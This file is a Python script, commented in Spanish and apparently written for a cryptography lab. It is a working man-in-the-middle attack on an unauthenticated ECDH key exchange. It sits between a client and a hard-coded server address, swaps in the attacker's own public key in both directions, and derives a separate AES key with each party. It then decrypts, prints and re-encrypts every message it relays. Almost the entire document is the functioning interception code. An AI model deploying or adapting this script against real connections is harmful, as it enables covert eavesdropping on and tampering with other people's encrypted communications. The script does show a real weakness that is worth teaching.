from cryptography.hazmat.primitives.asymmetric import ec  # Importar el módulo ec para curvas elípticas
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import socket
import os


# Funciones de cifrado y descifrado AES-256 en modo CBC
def aes_encrypt(key, plaintext):
    iv = os.urandom(16)  # Generar un IV aleatorio
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = iv + cipher.encrypt(pad(plaintext, AES.block_size))
    return ciphertext

def aes_decrypt(key, ciphertext):
    iv = ciphertext[:16]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    # Verifica si hay suficiente mensaje para desencriptar
    if len(ciphertext) <= 16:
        raise ValueError("Mensaje cifrado demasiado corto.")
    plaintext = unpad(cipher.decrypt(ciphertext[16:]), AES.block_size)
    return plaintext

# Crear las llaves del atacante (Actúa como intermediario)
attacker_private_key = ec.generate_private_key(ec.SECP256R1())
attacker_public_key = attacker_private_key.public_key()

# Serializar la llave pública del atacante
attacker_public_bytes = attacker_public_key.public_bytes(
    encoding=serialization.Encoding.X962,
    format=serialization.PublicFormat.UncompressedPoint
)

# Crear sockets para interceptar entre el cliente y el servidor
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('0.0.0.0', 65432))  # Escuchar en localhost y puerto 65432
server_socket.listen()

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('10.20.58.89', 65433))  # Conectar al servidor real

print("Atacante en espera de conexiones...")

# Aceptar conexión del cliente
conn, addr = server_socket.accept()
print(f"Conexión interceptada con el cliente: {addr}")

# Interceptar la llave pública del cliente
client_public_bytes = conn.recv(1024)
client_public_key = ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP256R1(), client_public_bytes)
print("Llave pública del cliente interceptada.")

# Enviar la llave pública del atacante al cliente en lugar de la del servidor
conn.sendall(attacker_public_bytes)

# Interceptar la llave pública del servidor
server_public_bytes = client_socket.recv(1024)
server_public_key = ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP256R1(), server_public_bytes)
print("Llave pública del servidor interceptada.")

# Enviar la llave pública del atacante al servidor en lugar de la del cliente
client_socket.sendall(attacker_public_bytes)

# Establecer llaves compartidas diferentes con el cliente y el servidor
shared_key_with_client = attacker_private_key.exchange(ec.ECDH(), client_public_key)
shared_key_with_server = attacker_private_key.exchange(ec.ECDH(), server_public_key)

# Derivar las llaves simétricas utilizando HKDF con SHA-256
derived_key_with_client = HKDF(
    algorithm=hashes.SHA256(),
    length=32,
    salt=None,
    info=b'handshake data with client'
).derive(shared_key_with_client)

derived_key_with_server = HKDF(
    algorithm=hashes.SHA256(),
    length=32,
    salt=None,
    info=b'handshake data with server'
).derive(shared_key_with_server)

print(f"Llave simétrica con el cliente: {derived_key_with_client.hex()}")
print(f"Llave simétrica con el servidor: {derived_key_with_server.hex()}")

# Comunicación cíclica interceptada
while True:
    try:
        # Interceptar mensaje del cliente
        ciphertext_from_client = conn.recv(2048)  # Aumenta el tamaño del buffer para recibir mensajes completos
        if not ciphertext_from_client:
            print("Cliente cerró la conexión.")
            break

        # Asegúrate de que el mensaje recibido sea mayor que el IV antes de intentar descifrar
        if len(ciphertext_from_client) > 16:
            try:
                decrypted_message_from_client = aes_decrypt(derived_key_with_client, ciphertext_from_client)
                print(f"Mensaje interceptado del cliente: {decrypted_message_from_client.decode()}")
            except ValueError as e:
                print(f"Error durante el descifrado del mensaje del cliente: {e}")
                continue  # Continuar escuchando

            # Reenviar el mensaje descifrado al servidor (cifrado con la llave del servidor)
            ciphertext_to_server = aes_encrypt(derived_key_with_server, decrypted_message_from_client)
            client_socket.sendall(ciphertext_to_server)
        else:
            print("Mensaje del cliente demasiado corto para descifrar.")

        # Interceptar respuesta del servidor
        ciphertext_from_server = client_socket.recv(2048)
        if not ciphertext_from_server:
            print("Servidor cerró la conexión.")
            break

        # Asegúrate de que el mensaje recibido sea mayor que el IV antes de intentar descifrar
        if len(ciphertext_from_server) > 16:
            try:
                decrypted_message_from_server = aes_decrypt(derived_key_with_server, ciphertext_from_server)
                print(f"Mensaje interceptado del servidor: {decrypted_message_from_server.decode()}")
            except ValueError as e:
                print(f"Error durante el descifrado del mensaje del servidor: {e}")
                continue  # Continuar escuchando

            # Reenviar el mensaje descifrado al cliente (cifrado con la llave del cliente)
            ciphertext_to_client = aes_encrypt(derived_key_with_client, decrypted_message_from_server)
            conn.sendall(ciphertext_to_client)
        else:
            print("Mensaje del servidor demasiado corto para descifrar.")

    except socket.error as socket_err:
        print(f"Error de socket: {socket_err}")
        continue  # Continuar escuchando, no cerrar la conexión

# Cerrar conexiones al final
conn.close()
client_socket.close()
print("Conexión cerrada por el atacante.")